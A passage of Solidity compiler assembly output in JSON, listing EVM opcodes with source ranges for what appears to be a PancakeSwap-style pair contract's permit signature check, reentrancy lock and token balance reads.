											"begin": 3816,
											"end": 4218,
											"name": "DUP1"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP6"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "ADD"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "SWAP7"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "SWAP1"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "SWAP7"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "MSTORE"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP1"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP6"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP7"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP7"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "PUSH",
											"value": "142"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP5"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "ADD"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP1"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP3"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "MSTORE"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "DUP7"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "MLOAD"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "SWAP7"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "DUP4"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "ADD"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "SWAP7"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "SWAP1"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "SWAP7"
										},
										{
											"begin": 3793,
											"end": 4228,
											"name": "KECCAK256"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP6"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP4"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MSTORE"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "162"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP5"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP3"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MSTORE"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP7"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MSTORE"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP10"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "AND"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "182"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP6"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MSTORE"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "1A2"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP5"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP9"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MSTORE"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "1C2"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP5"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP8"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MSTORE"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MLOAD"
										},
										{
											"begin": 3776,
											"end": 3790,
											"name": "SWAP2"
										},
										{
											"begin": 3776,
											"end": 3790,
											"name": "SWAP4"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "SWAP3"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "1E2"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP3"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP2"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP3"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "DUP2"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SUB"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP2"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP1"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "DUP6"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "GAS"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "STATICCALL"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "271"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "271"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "ADD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "MLOAD"
										},
										{
											"begin": 4265,
											"end": 4291,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4322,
											"end": 4352,
											"name": "DUP2"
										},
										{
											"begin": 4322,
											"end": 4352,
											"name": "AND"
										},
										{
											"begin": 4322,
											"end": 4352,
											"name": "ISZERO"
										},
										{
											"begin": 4322,
											"end": 4352,
											"name": "DUP1"
										},
										{
											"begin": 4322,
											"end": 4352,
											"name": "ISZERO"
										},
										{
											"begin": 4322,
											"end": 4352,
											"name": "SWAP1"
										},
										{
											"begin": 4322,
											"end": 4381,
											"name": "PUSH [tag]",
											"value": "272"
										},
										{
											"begin": 4322,
											"end": 4381,
											"name": "JUMPI"
										},
										{
											"begin": 4322,
											"end": 4381,
											"name": "POP"
										},
										{
											"begin": 4376,
											"end": 4381,
											"name": "DUP9"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4356,
											"end": 4381,
											"name": "AND"
										},
										{
											"begin": 4356,
											"end": 4372,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4356,
											"end": 4381,
											"name": "AND"
										},
										{
											"begin": 4356,
											"end": 4381,
											"name": "EQ"
										},
										{
											"begin": 4322,
											"end": 4381,
											"name": "tag",
											"value": "272"
										},
										{
											"begin": 4322,
											"end": 4381,
											"name": "JUMPDEST"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH [tag]",
											"value": "273"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "JUMPI"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "DUP1"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "DUP2"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "MSTORE"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "DUP3"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "ADD"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "MSTORE"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "1A"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "DUP3"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "ADD"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "MSTORE"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "50616E63616B653A20494E56414C49445F5349474E4154555245000000000000"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "DUP3"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "ADD"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "MSTORE"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "SWAP1"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "MLOAD"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "SWAP1"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "DUP2"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "SWAP1"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "SUB"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "ADD"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "SWAP1"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "REVERT"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "tag",
											"value": "273"
										},
										{
											"begin": 4301,
											"end": 4433,
											"name": "JUMPDEST"
										},
										{
											"begin": 4443,
											"end": 4474,
											"name": "PUSH [tag]",
											"value": "274"
										},
										{
											"begin": 4452,
											"end": 4457,
											"name": "DUP10"
										},
										{
											"begin": 4459,
											"end": 4466,
											"name": "DUP10"
										},
										{
											"begin": 4468,
											"end": 4473,
											"name": "DUP10"
										},
										{
											"begin": 4443,
											"end": 4451,
											"name": "PUSH [tag]",
											"value": "183"
										},
										{
											"begin": 4443,
											"end": 4474,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4443,
											"end": 4474,
											"name": "tag",
											"value": "274"
										},
										{
											"begin": 4443,
											"end": 4474,
											"name": "JUMPDEST"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "POP"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 6399,
											"end": 7680,
											"name": "tag",
											"value": "120"
										},
										{
											"begin": 6399,
											"end": 7680,
											"name": "JUMPDEST"
										},
										{
											"begin": 6452,
											"end": 6466,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1292,
											"end": 1300,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1292,
											"end": 1300,
											"name": "SLOAD"
										},
										{
											"begin": 1304,
											"end": 1305,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1292,
											"end": 1305,
											"name": "EQ"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH [tag]",
											"value": "276"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "JUMPI"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP2"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MLOAD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP2"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SUB"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "REVERT"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "tag",
											"value": "276"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "JUMPDEST"
										},
										{
											"begin": 1346,
											"end": 1347,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1335,
											"end": 1343,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1335,
											"end": 1347,
											"name": "DUP2"
										},
										{
											"begin": 1335,
											"end": 1347,
											"name": "SWAP1"
										},
										{
											"begin": 1335,
											"end": 1347,
											"name": "SSTORE"
										},
										{
											"begin": 1346,
											"end": 1347,
											"name": "DUP1"
										},
										{
											"begin": 6521,
											"end": 6534,
											"name": "PUSH [tag]",
											"value": "278"
										},
										{
											"begin": 6521,
											"end": 6532,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 6521,
											"end": 6534,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6521,
											"end": 6534,
											"name": "tag",
											"value": "278"
										},
										{
											"begin": 6521,
											"end": 6534,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6582,
											"end": 6588,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 6582,
											"end": 6588,
											"name": "SLOAD"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "DUP1"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "DUP2"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "MSTORE"
										},
										{
											"begin": 6608,
											"end": 6612,
											"name": "ADDRESS"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "DUP3"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "ADD"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "MSTORE"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "SWAP1"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "MLOAD"
										},
										{
											"begin": 6478,
											"end": 6534,
											"name": "SWAP4"
										},
										{
											"begin": 6478,
											"end": 6534,
											"name": "SWAP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6478,
											"end": 6534,
											"name": "SWAP2"
										},
										{
											"begin": 6478,
											"end": 6534,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6559,
											"end": 6572,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6559,
											"end": 6572,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6582,
											"end": 6588,
											"name": "SWAP1"
										},
										{
											"begin": 6582,
											"end": 6588,
											"name": "SWAP2"
										},
										{
											"begin": 6582,
											"end": 6588,
											"name": "AND"
										},
										{
											"begin": 6582,
											"end": 6588,
											"name": "SWAP2"
										},
										{
											"begin": 6575,
											"end": 6599,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 6575,
											"end": 6599,
											"name": "SWAP2"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "DUP1"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "DUP4"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "ADD"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "SWAP3"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "SWAP3"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "SWAP2"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "SWAP1"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "DUP3"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "SWAP1"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "SUB"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "ADD"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "DUP2"
										},
										{
											"begin": 6582,
											"end": 6588,
											"name": "DUP7"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "DUP1"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "279"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "279"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "POP"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "GAS"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "STATICCALL"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "280"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "280"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "POP"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "POP"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "POP"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "POP"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "MLOAD"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "281"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "281"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "MLOAD"
										},
										{
											"begin": 6647,
											"end": 6653,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 6647,
											"end": 6653,
											"name": "SLOAD"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "DUP1"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "DUP2"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "MSTORE"
										},
										{
											"begin": 6673,
											"end": 6677,
											"name": "ADDRESS"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "DUP3"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "ADD"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "MSTORE"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "SWAP1"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "MLOAD"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "SWAP3"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6624,
											"end": 6637,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6624,
											"end": 6637,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6647,
											"end": 6653,
											"name": "SWAP1"
										},
										{
											"begin": 6647,
											"end": 6653,
											"name": "SWAP3"
										},
										{
											"begin": 6647,
											"end": 6653,
											"name": "AND"
										},
										{
											"begin": 6647,
											"end": 6653,
											"name": "SWAP2"
										},
										{
											"begin": 6640,
											"end": 6664,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 6640,
											"end": 6664,
											"name": "SWAP2"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "DUP1"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "DUP3"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "ADD"
										},
										{
											"begin": 6640,
											"end": 6679,
